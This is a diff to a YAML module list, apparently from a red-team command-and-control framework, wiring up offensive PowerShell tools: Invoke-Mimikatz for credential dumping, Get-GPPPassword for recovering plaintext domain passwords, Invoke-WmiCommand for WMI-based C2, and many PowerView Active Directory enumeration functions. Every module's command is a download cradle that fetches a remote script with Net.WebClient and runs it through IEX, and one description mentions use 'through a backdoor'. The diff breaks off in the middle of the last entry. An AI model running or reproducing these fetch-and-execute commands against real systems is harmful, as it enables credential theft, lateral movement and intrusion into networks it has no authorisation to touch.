@@ -1,11 +1,12 @@
 powershell:
   -
     name: Invoke-Mimikatz
+    file: "Invoke-Mimikatz.ps1"
     arch: x64
     privilege: true
     author: "Russel Van Tuyl (@Ne0nd0g)"
     description: "Reflectively loads Mimikatz 2.0 in memory using PowerShell. Can be used to dump credentials without writing anything to disk. Can be used for any functionality provided with Mimikatz."
-    cmd: "powershell.exe -nop -WindowStyle 0 IEX (New-Object Net.WebClient).DownloadString($url$);Invoke-Mimikatz {{DumpCreds.Flag}} {{DumpCerts.Flag}} {{Command.Value}} {{ComputerName.Value}}"
+    cmd: "powershell.exe IEX (New-Object Net.WebClient).DownloadString($url$);Invoke-Mimikatz {{DumpCreds.Flag}} {{DumpCerts.Flag}} {{Command.Value}} {{ComputerName.Value}}"
     options:
       -
         name: DumpCreds
@@ -34,11 +35,12 @@ powershell:
 
   -
     name: Get-GPPPassword
+    file: "Get-GPPPassword.ps1"
     arch: x64
-    privilege: true
+    privilege: false
     author: "Chris Campbell (@obscuresec)"
     description: "Get-GPPPassword searches a domain controller for groups.xml, scheduledtasks.xml, services.xml and datasources.xml and returns plaintext passwords."
-    cmd: "powershell.exe -nop -WindowStyle 0 IEX (New-Object Net.WebClient).DownloadString($url$);Get-GPPPassword {{Server.Value}}"
+    cmd: "powershell.exe IEX (New-Object Net.WebClient).DownloadString($url$);Get-GPPPassword {{Server.Value}}"
     options:
       -
         name: Server
@@ -46,4 +48,1532 @@ powershell:
         required: false
         flag: -Server
         description: "Set the target server."
-      
+
+  -
+    name: Invoke-WmiCommand
+    file: "Invoke-WmiCommand.ps1"
+    arch: x64
+    privilege: false
+    author: "Matthew Graeber "
+    description: "Executes a PowerShell ScriptBlock on a target computer using WMI as a pure C2 channel."
+    cmd: "powershell.exe IEX (New-Object Net.WebClient).DownloadString($url$);Invoke-WmiCommand {{Payload.Value}} {{RegistryKeyPath.Value}} {{RegistryPayloadValueName.Value}} {{RegistryResultValueName.Value}} 
+    {{ComputerName.Value}} {{Credential.Value}} {{Impersonation.Value}} {{Authentication.Value}} {{EnableAllPrivileges.Value}} {{Authority.Value}}"
+    options:
+      -
+        name: Payload
+        value: null
+        required: false
+        flag: -Payload
+        description: "Specifies the payload to be executed on the remote system."
+      -
+        name: RegistryKeyPath
+        value: null
+        required: false
+        flag: -RegistryKeyPath
+        description: "Specifies the registry key where the payload and payload output will be stored."
+      -
+        name: RegistryPayloadValueName
+        value: null
+        required: false
+        flag: -RegistryPayloadValueName
+        description: "Specifies the registry value name where the payload will be stored."
+      -
+        name: RegistryResultValueName
+        value: null
+        required: false
+        flag: -RegistryResultValueName
+        description: "Specifies the registry value name where the payload output will be stored."
+      -
+        name: ComputerName
+        value: null
+        required: false
+        flag: -ComputerName
+        description: "Runs the command on the specified computers. The default is the local computer."
+      -
+        name: Credential
+        value: null
+        required: false
+        flag: -Credential
+        description: "Specifies a user account that has permission to perform this action. The default is the current user. Type a user name, such as \"User01\", \"Domain01\\User01\", or User@Contoso.com. Or, enter a PSCredential object, such as an object that is returned by the Get-Credential cmdlet. When you type a user name, you will be prompted for a password."
+      -
+        name: Impersonation
+        value: null
+        required: false
+        flag: -Impersonation
+        description: "Specifies the impersonation level to use. Valid values are: \n
+0: Default (Reads the local registry for the default impersonation level, which is usually set to \"3: Impersonate\".)\n
+1: Anonymous (Hides the credentials of the caller.)\n
+2: Identify (Allows objects to query the credentials of the caller.)\n
+3: Impersonate (Allows objects to use the credentials of the caller.)\n
+4: Delegate (Allows objects to permit other objects to use the credentials of the caller.)\n"
+      -
+        name: Authentication
+        value: null
+        required: false
+        flag: -Authentication
+        description: "Specifies the authentication level to be used with the WMI connection. Valid values are:\n
+-1: Unchanged\n
+0: Default\n
+1: None (No authentication in performed.)\n
+2: Connect (Authentication is performed only when the client establishes a relationship with the application.)\n
+3: Call (Authentication is performed only at the beginning of each call when the application receives the request.)\n
+4: Packet (Authentication is performed on all the data that is received from the client.)\n
+5: PacketIntegrity (All the data that is transferred between the client  and the application is authenticated and verified.)\n
+6: PacketPrivacy (The properties of the other authentication levels are used, and all the data is encrypted.)\n"
+      -
+        name: EnableAllPrivileges
+        value: null
+        required: false
+        flag: -EnableAllPrivileges
+        description: "Enables all the privileges of the current user before the command makes the WMI call."
+      -
+        name: Authority
+        value: null
+        required: false
+        flag: -Authority
+        description: "Specifies the authority to use to authenticate the WMI connection. You can specify standard NTLM or Kerberos authentication. To use NTLM, set the authority setting to ntlmdomain:<DomainName>, where <DomainName> identifies a valid NTLM domain name. To use Kerberos, specify kerberos:<DomainName\\ServerName>. You cannot include the authority setting when you connect to the local computer."
+
+
+  -
+    name: Get-HttpStatus
+    file: "Get-HttpStatus.ps1"
+    arch: x64
+    privilege: false
+    author: "Chris Campbell (@obscuresec) "
+    description: "Returns the HTTP Status Codes and full URL for specified paths."
+    cmd: "powershell.exe IEX (New-Object Net.WebClient).DownloadString($url$);Get-HttpStatus {{Target.Value}} {{Path.Value}} {{Port.Value}} {{UseSSL.Flag}}"
+    options:
+      -
+        name: Target
+        value: null
+        required: false
+        flag: -Target
+        description: "Specifies the remote web host either by IP or hostname."
+      -
+        name: Path
+        value: null
+        required: false
+        flag: -Path
+        description: "Specifies the remost host."
+      -
+        name: Port
+        value: null
+        required: false
+        flag: -Port
+        description: "Specifies the port to connect to."
+      -
+        name: UseSSL
+        value: false
+        required: false
+        flag: -UseSSL
+        description: "Use an SSL connection."
+
+  -
+    name: Get-ComputerDetail
+    file: "Get-ComputerDetail.ps1"
+    arch: x64
+    privilege: true
+    author: "Joe Bialek, Twitter: @JosephBialek "
+    description: "This script is used to get useful information from a computer."
+    cmd: "powershell.exe IEX (New-Object Net.WebClient).DownloadString($url$);Get-ComputerDetail {{ToString.Flag}}"
+    options:
+      -
+        name: ToString
+        value: null
+        required: false
+        flag: -ToString
+        description: "Switch: Outputs the data as text instead of objects, good if you are using this script through a backdoor."
+
+  -
+    name: Get-Domain
+    file: "PowerView.ps1"
+    arch: x64
+    privilege: false
+    author: "Will Schroeder (@harmj0y) "
+    description: "Returns the domain object for the current (or specified) domain."
+    cmd: "powershell.exe IEX (New-Object Net.WebClient).DownloadString($url$);Get-Domain {{Domain.Value}} {{Credential.Value}}"
+    options:
+      -
+        name: Domain
+        value: null
+        required: false
+        flag: -Domain
+        description: "Specifies the domain name to query for, defaults to the current domain."
+      -
+        name: Credential
+        value: null
+        required: false
+        flag: -Credential
+        description: "A [Management.Automation.PSCredential] object of alternate credentials for connection to the target domain."
+
+  -
+    name: Get-DomainController
+    file: "PowerView.ps1"
+    arch: x64
+    privilege: false
+    author: "Will Schroeder (@harmj0y) "
+    description: "Return the domain controllers for the current (or specified) domain."
+    cmd: "powershell.exe IEX (New-Object Net.WebClient).DownloadString($url$);Get-DomainController {{Domain.Value}} {{Server.Value}} {{LDAP.Flag}} {{Credential.Value}}"
+    options:
+      -
+        name: Domain
+        value: null
+        required: false
+        flag: -Domain
+        description: "The domain to query for domain controllers, defaults to the current domain."
+      -
+        name: Server
+        value: null
+        required: false
+        flag: -Server
+        description: "Specifies an Active Directory server (domain controller) to bind to."
+      -
+        name: LDAP
+        value: null
+        required: false
+        flag: -LDAP
+        description: "Switch. Use LDAP queries to determine the domain controllers instead of built in .NET methods."
+      -
+        name: Credential
+        value: null
+        required: false
+        flag: -Credential
+        description: "A [Management.Automation.PSCredential] object of alternate credentials for connection to the target domain."
+  
+  -
+    name: Get-DomainUser
+    file: "PowerView.ps1"
+    arch: x64
+    privilege: false
+    author: "Will Schroeder (@harmj0y) "
+    description: "Return all users or specific user objects in AD."
+    cmd: "powershell.exe IEX (New-Object Net.WebClient).DownloadString($url$);Get-DomainUser {{SPN.Flag}} {{UACFilter.Value}} {{AdminCount.Flag}} {{AllowDelegation.Flag}}
+     {{DisallowDelegation.Flag}} {{TrustedToAuth.Flag}} {{PreauthNotRequired.Flag}} {{Domain.Value}} {{LDAPFilter.Value}} {{Properties.Value}} {{SearchBase.Value}} {{Server.Value}}
+      {{SearchScope.Value}} {{ResultPageSize.Value}} {{ServerTimeLimit.Value}} {{SecurityMasks.Value}} {{Tombstone.Flag}} {{FindOne.Value}} {{Credential.Value}} {{Raw.Flag}}"
+    options:
+      -
+        name: SPN
+        value: null
+        required: false
+        flag: -SPN
+        description: "Switch. Only return user objects with non-null service principal names."
+      -
+        name: UACFilter
+        value: null
+        required: false
+        flag: -UACFilter
+        description: "Dynamic parameter that accepts one or more values from $UACEnum, including \"NOT_X\" negation forms. To see all possible values, run '0|ConvertFrom-UACValue -ShowAll'."
+      -
+        name: AdminCount
+        value: null
+        required: false
+        flag: -AdminCount
+        description: "Switch. Return users with '(adminCount=1)' (meaning are/were privileged)."
+      -
+        name: AllowDelegation
+        value: null
+        required: false
+        flag: -AllowDelegation
+        description: "Switch. Return user accounts that are not marked as 'sensitive and not allowed for delegation'"
+      -
+        name: DisallowDelegation
+        value: null
+        required: false
+        flag: -DisallowDelegation
+        description: "Switch. Return user accounts that are marked as 'sensitive and not allowed for delegation'"
+      -
+        name: TrustedToAuth
+        value: null
+        required: false
+        flag: -TrustedToAuth
+        description: "Switch. Return computer objects that are trusted to authenticate for other principals."
+      -
+        name: PreauthNotRequired
+        value: null
+        required: false
+        flag: -PreauthNotRequired
+        description: "Switch. Return user accounts with \"Do not require Kerberos preauthentication\" set."
+      -
+        name: Domain
+        value: null
+        required: false
+        flag: -Domain
+        description: "Specifies the domain to use for the query, defaults to the current domain."
+      -
+        name: LDAPFilter
+        value: null
+        required: false
+        flag: -LDAPFilter
+        description: "Specifies an LDAP query string that is used to filter Active Directory objects."
+      -
+        name: Properties
+        value: null
+        required: false
+        flag: -Properties
+        description: "Specifies the properties of the output object to retrieve from the server."
+      -
+        name: SearchBase
+        value: null
+        required: false
+        flag: -SearchBase
+        description: "The LDAP source to search through, e.g. \"LDAP://OU=secret,DC=testlab,DC=local\" Useful for OU queries."
+      -
+        name: Server
+        value: null
+        required: false
+        flag: -Server
+        description: "Specifies an Active Directory server (domain controller) to bind to."
+      -
+        name: SearchScope
+        value: null
+        required: false
+        flag: -SearchScope
+        description: "Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree)."
+      -
+        name: ResultPageSize
+        value: null
+        required: false
+        flag: -ResultPageSize
+        description: "Specifies the PageSize to set for the LDAP searcher object."
+      -
+        name: ServerTimeLimit
+        value: null
+        required: false
+        flag: -ServerTimeLimit
+        description: "Specifies the maximum amount of time the server spends searching. Default of 120 seconds."
+      -
+        name: SecurityMasks
+        value: null
+        required: false
+        flag: -SecurityMasks
+        description: "Specifies an option for examining security information of a directory object. One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'."
+      -
+        name: Tombstone
+        value: null
+        required: false
+        flag: -Tombstone
+        description: "Switch. Specifies that the searcher should also return deleted/tombstoned objects."
+      -
+        name: FindOne
+        value: null
+        required: false
+        flag: -FindOne
+        description: "Only return one result object."
+      -
+        name: Credential
+        value: null
+        required: false
+        flag: -Credential
+        description: "A [Management.Automation.PSCredential] object of alternate credentials for connection to the target domain."
+      -
+        name: Raw
+        value: null
+        required: false
+        flag: -Raw
+        description: "Switch. Return raw results instead of translating the fields into a custom PSObject."
+  
+  -
+    name: Get-DomainUserEvent
+    file: "PowerView.ps1"
+    arch: x64
+    privilege: false
+    author: "Lee Christensen (@tifkin_), Justin Warner (@sixdub), Will Schroeder (@harmj0y) "
+    description: "Enumerate account logon events (ID 4624) and Logon with explicit credential events (ID 4648) from the specified host (default of the localhost)."
+    cmd: "powershell.exe IEX (New-Object Net.WebClient).DownloadString($url$);Get-DomainUserEvent {{ComputerName.Value}} {{StartTime.Value}}
+      {{EndTime.Value}} {{MaxEvents.Value}} {{Credential.Value}}"
+    options:
+      -
+        name: ComputerName
+        value: null
+        required: false
+        flag: -ComputerName
+        description: "Specifies the computer name to retrieve events from, default of localhost."
+      -
+        name: StartTime
+        value: null
+        required: false
+        flag: -StartTime
+        description: "The [DateTime] object representing the start of when to collect events. Default of [DateTime]::Now.AddDays(-1)."
+      -
+        name: EndTime
+        value: null
+        required: false
+        flag: -EndTime
+        description: "The [DateTime] object representing the end of when to collect events. Default of [DateTime]::Now."
+      -
+        name: MaxEvents
+        value: null
+        required: false
+        flag: -MaxEvents
+        description: "The maximum number of events to retrieve. Default of 5000."
+      -
+        name: Credential
+        value: null
+        required: false
+        flag: -Credential
+        description: "A [Management.Automation.PSCredential] object of alternate credentials for connection to the target domain."
+
+  -
+    name: Get-DomainForeignUser
+    file: "PowerView.ps1"
+    arch: x64
+    privilege: false
+    author: "Will Schroeder (@harmj0y) "
+    description: "Enumerates users who are in groups outside of the user's domain. This is a domain's \"outgoing\" access."
+    cmd: "powershell.exe IEX (New-Object Net.WebClient).DownloadString($url$);Get-DomainForeignUser {{Domain.Value}} {{LDAPFilter.Value}} {{Properties.Value}} {{SearchBase.Value}} {{Server.Value}}
+      {{SearchScope.Value}} {{ResultPageSize.Value}} {{ServerTimeLimit.Value}} {{SecurityMasks.Value}} {{Tombstone.Flag}} {{Credential.Value}}"
+    options:
+      -
+        name: Domain
+        value: null
+        required: false
+        flag: -Domain
+        description: "Specifies the domain to use for the query, defaults to the current domain."
+      -
+        name: LDAPFilter
+        value: null
+        required: false
+        flag: -LDAPFilter
+        description: "Specifies an LDAP query string that is used to filter Active Directory objects."
+      -
+        name: Properties
+        value: null
+        required: false
+        flag: -Properties
+        description: "Specifies the properties of the output object to retrieve from the server."
+      -
+        name: SearchBase
+        value: null
+        required: false
+        flag: -SearchBase
+        description: "The LDAP source to search through, e.g. \"LDAP://OU=secret,DC=testlab,DC=local\" Useful for OU queries."
+      -
+        name: Server
+        value: null
+        required: false
+        flag: -Server
+        description: "Specifies an Active Directory server (domain controller) to bind to."
+      -
+        name: SearchScope
+        value: null
+        required: false
+        flag: -SearchScope
+        description: "Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree)."
+      -
+        name: ResultPageSize
+        value: null
+        required: false
+        flag: -ResultPageSize
+        description: "Specifies the PageSize to set for the LDAP searcher object."
+      -
+        name: ServerTimeLimit
+        value: null
+        required: false
+        flag: -ServerTimeLimit
+        description: "Specifies the maximum amount of time the server spends searching. Default of 120 seconds."
+      -
+        name: SecurityMasks
+        value: null
+        required: false
+        flag: -SecurityMasks
+        description: "Specifies an option for examining security information of a directory object. One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'."
+      -
+        name: Tombstone
+        value: null
+        required: false
+        flag: -Tombstone
+        description: "Switch. Specifies that the searcher should also return deleted/tombstoned objects."
+      -
+        name: Credential
+        value: null
+        required: false
+        flag: -Credential
+        description: "A [Management.Automation.PSCredential] object of alternate credentials for connection to the target domain."
+
+  -
+    name: Get-DomainSearcher
+    file: "PowerView.ps1"
+    arch: x64
+    privilege: false
+    author: "Will Schroeder (@harmj0y) "
+    description: "Helper used by various functions that builds a custom AD searcher object."
+    cmd: "powershell.exe IEX (New-Object Net.WebClient).DownloadString($url$);Get-DomainSearcher {{Domain.Value}} {{LDAPFilter.Value}} {{Properties.Value}} {{SearchBase.Value}} {{SearchBasePrefix.Value}} {{Server.Value}}
+      {{SearchScope.Value}} {{ResultPageSize.Value}} {{ServerTimeLimit.Value}} {{SecurityMasks.Value}} {{Tombstone.Flag}} {{FindOne.Value}} {{Credential.Value}}"
+    options:
+      -
+        name: Domain
+        value: null
+        required: false
+        flag: -Domain
+        description: "Specifies the domain to use for the query, defaults to the current domain."
+      -
+        name: LDAPFilter
+        value: null
+        required: false
+        flag: -LDAPFilter
+        description: "Specifies an LDAP query string that is used to filter Active Directory objects."
+      -
+        name: Properties
+        value: null
+        required: false
+        flag: -Properties
+        description: "Specifies the properties of the output object to retrieve from the server."
+      -
+        name: SearchBase
+        value: null
+        required: false
+        flag: -SearchBase
+        description: "The LDAP source to search through, e.g. \"LDAP://OU=secret,DC=testlab,DC=local\" Useful for OU queries."
+      -
+        name: SearchBasePrefix
+        value: null
+        required: false
+        flag: -SearchBasePrefix
+        description: "Specifies a prefix for the LDAP search string (i.e. \"CN=Sites,CN=Configuration\")."
+      -
+        name: Server
+        value: null
+        required: false
+        flag: -Server
+        description: "Specifies an Active Directory server (domain controller) to bind to."
+      -
+        name: SearchScope
+        value: null
+        required: false
+        flag: -SearchScope
+        description: "Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree)."
+      -
+        name: ResultPageSize
+        value: null
+        required: false
+        flag: -ResultPageSize
+        description: "Specifies the PageSize to set for the LDAP searcher object."
+      -
+        name: ServerTimeLimit
+        value: null
+        required: false
+        flag: -ServerTimeLimit
+        description: "Specifies the maximum amount of time the server spends searching. Default of 120 seconds."
+      -
+        name: SecurityMasks
+        value: null
+        required: false
+        flag: -SecurityMasks
+        description: "Specifies an option for examining security information of a directory object. One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'."
+      -
+        name: Tombstone
+        value: null
+        required: false
+        flag: -Tombstone
+        description: "Switch. Specifies that the searcher should also return deleted/tombstoned objects."
+      -
+        name: FindOne
+        value: null
+        required: false
+        flag: -FindOne
+        description: "Only return one result object."
+      -
+        name: Credential
+        value: null
+        required: false
+        flag: -Credential
+        description: "A [Management.Automation.PSCredential] object of alternate credentials for connection to the target domain."
+
+  -
+    name: Get-DomainOU
+    file: "PowerView.ps1"
+    arch: x64
+    privilege: false
+    author: "Will Schroeder (@harmj0y) "
+    description: "Search for all organization units (OUs) or specific OU objects in AD."
+    cmd: "powershell.exe IEX (New-Object Net.WebClient).DownloadString($url$);Get-DomainOU {{GPLink.Value}} {{Domain.Value}} {{LDAPFilter.Value}} {{Properties.Value}} {{SearchBase.Value}} {{Server.Value}}
+      {{SearchScope.Value}} {{ResultPageSize.Value}} {{ServerTimeLimit.Value}} {{SecurityMasks.Value}} {{Tombstone.Flag}} {{FindOne.Value}} {{Credential.Value}} {{Raw.Flag}}"
+    options:
+      -
+        name: Identity
+        value: null
+        required: false
+        flag: -Identity
+        description: "An OU name (e.g. TestOU), DistinguishedName (e.g. OU=TestOU,DC=testlab,DC=local), or GUID (e.g. 8a9ba22a-8977-47e6-84ce-8c26af4e1e6a). Wildcards accepted."
+      -
+        name: GPLink
+        value: null
+        required: false
+        flag: -GPLink
+        description: "Only return OUs with the specified GUID in their gplink property."
+      -
+        name: Domain
+        value: null
+        required: false
+        flag: -Domain
+        description: "Specifies the domain to use for the query, defaults to the current domain."
+      -
+        name: LDAPFilter
+        value: null
+        required: false
+        flag: -LDAPFilter
+        description: "Specifies an LDAP query string that is used to filter Active Directory objects."
+      -
+        name: Properties
+        value: null
+        required: false
+        flag: -Properties
+        description: "Specifies the properties of the output object to retrieve from the server."
+      -
+        name: SearchBase
+        value: null
+        required: false
+        flag: -SearchBase
+        description: "The LDAP source to search through, e.g. \"LDAP://OU=secret,DC=testlab,DC=local\" Useful for OU queries."
+      -
+        name: Server
+        value: null
+        required: false
+        flag: -Server
+        description: "Specifies an Active Directory server (domain controller) to bind to."
+      -
+        name: SearchScope
+        value: null
+        required: false
+        flag: -SearchScope
+        description: "Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree)."
+      -
+        name: ResultPageSize
+        value: null
+        required: false
+        flag: -ResultPageSize
+        description: "Specifies the PageSize to set for the LDAP searcher object."
+      -
+        name: ServerTimeLimit
+        value: null
+        required: false
+        flag: -ServerTimeLimit
+        description: "Specifies the maximum amount of time the server spends searching. Default of 120 seconds."
+      -
+        name: SecurityMasks
+        value: null
+        required: false
+        flag: -SecurityMasks
+        description: "Specifies an option for examining security information of a directory object. One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'."
+      -
+        name: Tombstone
+        value: null
+        required: false
+        flag: -Tombstone
+        description: "Switch. Specifies that the searcher should also return deleted/tombstoned objects."
+      -
+        name: FindOne
+        value: null
+        required: false
+        flag: -FindOne
+        description: "Only return one result object."
+      -
+        name: Credential
+        value: null
+        required: false
+        flag: -Credential
+        description: "A [Management.Automation.PSCredential] object of alternate credentials for connection to the target domain."
+      -
+        name: Raw
+        value: null
+        required: false
+        flag: -Raw
+        description: "Switch. Return raw results instead of translating the fields into a custom PSObject."
+
+  -
+    name: Get-DomainGroupMember
+    file: "PowerView.ps1"
+    arch: x64
+    privilege: false
+    author: "Will Schroeder (@harmj0y) "
+    description: "Return the members of a specific domain group."
+    cmd: "powershell.exe IEX (New-Object Net.WebClient).DownloadString($url$);Get-DomainGroupMember {{Identity.Value}} {{Domain.Value}} {{Recurse.Flag}} {{LDAPFilter.Value}} {{RecurseUsingMatchingRule.Flag}}
+     {{LDAPFilter.Value}} {{SearchBase.Value}} {{Server.Value}} {{SearchScope.Value}} {{ResultPageSize.Value}} {{ServerTimeLimit.Value}} {{SecurityMasks.Value}} {{Tombstone.Flag}} {{Credential.Value}}"
+    options:
+      -
+        name: Identity
+        value: null
+        required: false
+        flag: -Identity
+        description: "A SamAccountName (e.g. Group1), DistinguishedName (e.g. CN=group1,CN=Users,DC=testlab,DC=local), SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1114), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d202) specifying the group to query for. Wildcards accepted."
+      -
+        name: Domain
+        value: null
+        required: false
+        flag: -Domain
+        description: "Specifies the domain to use for the query, defaults to the current domain."
+      -
+        name: Recurse
+        value: null
+        required: false
+        flag: -Recurse
+        description: "Switch. If the group member is a group, recursively try to query its members as well."
+      -
+        name: RecurseUsingMatchingRule
+        value: null
+        required: false
+        flag: -RecurseUsingMatchingRule
+        description: "Switch. Use LDAP_MATCHING_RULE_IN_CHAIN in the LDAP search query to recurse."
+      -
+        name: LDAPFilter
+        value: null
+        required: false
+        flag: -LDAPFilter
+        description: "Specifies an LDAP query string that is used to filter Active Directory objects."
+      -
+        name: SearchBase
+        value: null
+        required: false
+        flag: -SearchBase
+        description: "The LDAP source to search through, e.g. \"LDAP://OU=secret,DC=testlab,DC=local\" Useful for OU queries."
+      -
+        name: Server
+        value: null
+        required: false
+        flag: -Server
+        description: "Specifies an Active Directory server (domain controller) to bind to."
+      -
+        name: SearchScope
+        value: null
+        required: false
+        flag: -SearchScope
+        description: "Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree)."
+      -
+        name: ResultPageSize
+        value: null
+        required: false
+        flag: -ResultPageSize
+        description: "Specifies the PageSize to set for the LDAP searcher object."
+      -
+        name: ServerTimeLimit
+        value: null
+        required: false
+        flag: -ServerTimeLimit
+        description: "Specifies the maximum amount of time the server spends searching. Default of 120 seconds."
+      -
+        name: SecurityMasks
+        value: null
+        required: false
+        flag: -SecurityMasks
+        description: "Specifies an option for examining security information of a directory object. One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'."
+      -
+        name: Tombstone
+        value: null
+        required: false
+        flag: -Tombstone
+        description: "Switch. Specifies that the searcher should also return deleted/tombstoned objects."
+      -
+        name: Credential
+        value: null
+        required: false
+        flag: -Credential
+        description: "A [Management.Automation.PSCredential] object of alternate credentials for connection to the target domain."
+
+  -
+    name: Get-DomainGroupMemberDeleted
+    file: "PowerView.ps1"
+    arch: x64
+    privilege: false
+    author: "Will Schroeder (@harmj0y) "
+    description: "Returns information on group members that were removed from the specified group identity. Accomplished by searching the linked attribute replication metadata for the group using Get-DomainObjectLinkedAttributeHistory."
+    cmd: "powershell.exe IEX (New-Object Net.WebClient).DownloadString($url$);Get-DomainGroupMemberDeleted {{Identity.Value}} {{Domain.Value}} {{LDAPFilter.Value}}
+     {{SearchBase.Value}} {{Server.Value}} {{SearchScope.Value}} {{ResultPageSize.Value}} {{ServerTimeLimit.Value}} {{Tombstone.Flag}} {{Credential.Value}}"
+    options:
+      -
+        name: Identity
+        value: null
+        required: false
+        flag: -Identity
+        description: "A SamAccountName (e.g. Group1), DistinguishedName (e.g. CN=group1,CN=Users,DC=testlab,DC=local), SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1114), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d202) specifying the group to query for. Wildcards accepted."
+      -
+        name: Domain
+        value: null
+        required: false
+        flag: -Domain
+        description: "Specifies the domain to use for the query, defaults to the current domain."
+      -
+        name: LDAPFilter
+        value: null
+        required: false
+        flag: -LDAPFilter
+        description: "Specifies an LDAP query string that is used to filter Active Directory objects."
+      -
+          name: Properties
+          value: null
+          required: false
+          flag: -Properties
+          description: "Specifies the properties of the output object to retrieve from the server."
+      -
+        name: SearchBase
+        value: null
+        required: false
+        flag: -SearchBase
+        description: "The LDAP source to search through, e.g. \"LDAP://OU=secret,DC=testlab,DC=local\" Useful for OU queries."
+      -
+        name: Server
+        value: null
+        required: false
+        flag: -Server
+        description: "Specifies an Active Directory server (domain controller) to bind to."
+      -
+        name: SearchScope
+        value: null
+        required: false
+        flag: -SearchScope
+        description: "Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree)."
+      -
+        name: ResultPageSize
+        value: null
+        required: false
+        flag: -ResultPageSize
+        description: "Specifies the PageSize to set for the LDAP searcher object."
+      -
+        name: ServerTimeLimit
+        value: null
+        required: false
+        flag: -ServerTimeLimit
+        description: "Specifies the maximum amount of time the server spends searching. Default of 120 seconds."
+      -
+        name: Tombstone
+        value: null
+        required: false
+        flag: -Tombstone
+        description: "Switch. Specifies that the searcher should also return deleted/tombstoned objects."
+      -
+        name: FindOne
+        value: null
+        required: false
+        flag: -FindOne
+        description: "Only return one result object."
+      -
+        name: Credential
+        value: null
+        required: false
+        flag: -Credential
+        description: "A [Management.Automation.PSCredential] object of alternate credentials for connection to the target domain."
+
+  -
+    name: Get-DomainGPO
+    file: "PowerView.ps1"
+    arch: x64
+    privilege: false
+    author: "Will Schroeder (@harmj0y) "
+    description: "Return all GPOs or specific GPO objects in AD."
+    cmd: "powershell.exe IEX (New-Object Net.WebClient).DownloadString($url$);Get-DomainGPO {{Identity.Value}} {{ComputerIdentity.Value}} {{UserIdentity.Value}} {{Domain.Value}} {{LDAPFilter.Value}}
+     {{SearchBase.Value}} {{Server.Value}} {{SearchScope.Value}} {{ResultPageSize.Value}} {{ServerTimeLimit.Value}} {{Tombstone.Flag}} {{FindOne.Value}} {{Credential.Value}} {{Raw.Flag}}"
+    options:
+      -
+        name: Identity
+        value: null
+        required: false
+        flag: -Identity
+        description: "A display name (e.g. 'Test GPO'), DistinguishedName (e.g. 'CN={F260B76D-55C8-46C5-BEF1-9016DD98E272},CN=Policies,CN=System,DC=testlab,DC=local'), GUID (e.g. '10ec320d-3111-4ef4-8faf-8f14f4adc789'), or GPO name (e.g. '{F260B76D-55C8-46C5-BEF1-9016DD98E272}'). Wildcards accepted."
+      -
+        name: ComputerIdentity
+        value: null
+        required: false
+        flag: -ComputerIdentity
+        description: "Return all GPO objects applied to a given computer identity (name, dnsname, DistinguishedName, etc.)."
+      -
+        name: UserIdentity
+        value: null
+        required: false
+        flag: -UserIdentity
+        description: "Return all GPO objects applied to a given user identity (name, SID, DistinguishedName, etc.)."
+      -
+        name: Domain
+        value: null
+        required: false
+        flag: -Domain
+        description: "Specifies the domain to use for the query, defaults to the current domain."
+      -
+        name: LDAPFilter
+        value: null
+        required: false
+        flag: -LDAPFilter
+        description: "Specifies an LDAP query string that is used to filter Active Directory objects."
+      -
+        name: SearchBase
+        value: null
+        required: false
+        flag: -SearchBase
+        description: "The LDAP source to search through, e.g. \"LDAP://OU=secret,DC=testlab,DC=local\" Useful for OU queries."
+      -
+        name: Server
+        value: null
+        required: false
+        flag: -Server
+        description: "Specifies an Active Directory server (domain controller) to bind to."
+      -
+        name: SearchScope
+        value: null
+        required: false
+        flag: -SearchScope
+        description: "Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree)."
+      -
+        name: ResultPageSize
+        value: null
+        required: false
+        flag: -ResultPageSize
+        description: "Specifies the PageSize to set for the LDAP searcher object."
+      -
+        name: ServerTimeLimit
+        value: null
+        required: false
+        flag: -ServerTimeLimit
+        description: "Specifies the maximum amount of time the server spends searching. Default of 120 seconds."
+      -
+        name: Tombstone
+        value: null
+        required: false
+        flag: -Tombstone
+        description: "Switch. Specifies that the searcher should also return deleted/tombstoned objects."
+      -
+        name: Credential
+        value: null
+        required: false
+        flag: -Credential
+        description: "A [Management.Automation.PSCredential] object of alternate credentials for connection to the target domain."
+      -
+        name: Raw
+        value: null
+        required: false
+        flag: -Raw
+        description: "Switch. Return raw results instead of translating the fields into a custom PSObject."
+
+
+  -
+    name: Get-Forest
+    file: "PowerView.ps1"
+    arch: x64
+    privilege: false
+    author: "Will Schroeder (@harmj0y) "
+    description: "Returns the forest object for the current (or specified) forest."
+    cmd: "powershell.exe IEX (New-Object Net.WebClient).DownloadString($url$);Get-Forest {{Forest.Value}} {{Credential.Value}}"
+    options:
+      -
+        name: Forest
+        value: null
+        required: false
+        flag: -Forest
+        description: "The forest name to query for, defaults to the current forest."
+      -
+        name: Credential
+        value: null
+        required: false
+        flag: -Credential
+        description: "A [Management.Automation.PSCredential] object of alternate credentials for connection to the target forest."
+
+  -
+    name: Get-NetLocalGroup
+    file: "PowerView.ps1"
+    arch: x64
+    privilege: false
+    author: "Will Schroeder (@harmj0y) "
+    description: "Enumerates the local groups on the local (or remote) machine."
+    cmd: "powershell.exe IEX (New-Object Net.WebClient).DownloadString($url$);Get-NetLocalGroup {{ComputerName.Value}} {{Credential.Value}}"
+    options:
+      -
+        name: ComputerName
+        value: null
+        required: false
+        flag: -ComputerName
+        description: "Specifies the hostname to query for shares (also accepts IP addresses). Defaults to 'localhost'."
+      -
+        name: Credential
+        value: null
+        required: false
+        flag: -Credential
+        description: "A [Management.Automation.PSCredential] object of alternate credentials for connection to a remote machine. Only applicable with \"-Method WinNT\"."
+
+  -
+    name: Get-NetLocalGroupMember
+    file: "PowerView.ps1"
+    arch: x64
+    privilege: false
